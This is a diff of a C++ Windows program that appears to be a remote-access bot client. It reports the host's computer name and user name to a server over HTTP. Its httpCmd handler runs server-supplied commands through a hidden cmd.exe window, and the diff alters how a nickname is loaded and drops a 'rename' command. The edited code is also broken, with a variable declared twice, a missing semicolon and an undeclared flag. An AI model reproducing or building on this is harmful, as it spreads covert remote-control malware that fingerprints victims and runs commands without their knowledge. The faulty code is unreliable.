@@ -113,9 +113,9 @@ int main(int argc, char *argv[])
 	//c'est a moi ça xD
 	string pseudo;
 	bool name;
-	ifstream name("ID.txt", ios::in);
+	ifstream name();
 
-	name.open()
+	name.open("ID.txt")
 		if (name)
 		{
 			getline(name, pseudo);
@@ -435,7 +435,10 @@ int main(int argc, char *argv[])
 				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
 				str << "compName=" << pValue1 << "&";
 				_dupenv_s(&pValue2, &len2, "USERNAME");
-				str << "userName=" << username;
+				if (nom == false)
+					str << "userName=" << username;
+				else
+					str << "userName=" << pseudo;
 				request.setUri(str.str());
 
 				response = http.sendRequest(request);
@@ -464,7 +467,10 @@ int main(int argc, char *argv[])
 				_dupenv_s(&pValue1, &len1, "COMPUTERNAME");
 				str << "compName=" << pValue1 << "&";
 				_dupenv_s(&pValue2, &len2, "USERNAME");
-				str << "userName=" << username;
+				if (nom == false)
+					str << "userName=" << username;
+				else
+					str << "userName=" << pseudo;
 				request.setUri(str.str());
 
 				response = http.sendRequest(request);
@@ -513,13 +519,6 @@ void httpCmd(string cmd, string arg1, string arg2, string arg3)
 		string resultSystem = "/C " + arg1;
 		cout << "system arg1: " << arg1 << endl;
 		ShellExecuteA(NULL, "open", "cmd.exe", resultSystem.c_str(), "C:\\ProgramData\\", SW_HIDE);
-	}
-
-	if (cmd == "rename")
-	{
-		ofstream name("ID.txt", ios::out | ios::trunc);
-		name << arg1;
-		name.close();
 	}
 
 	if (cmd == "send")
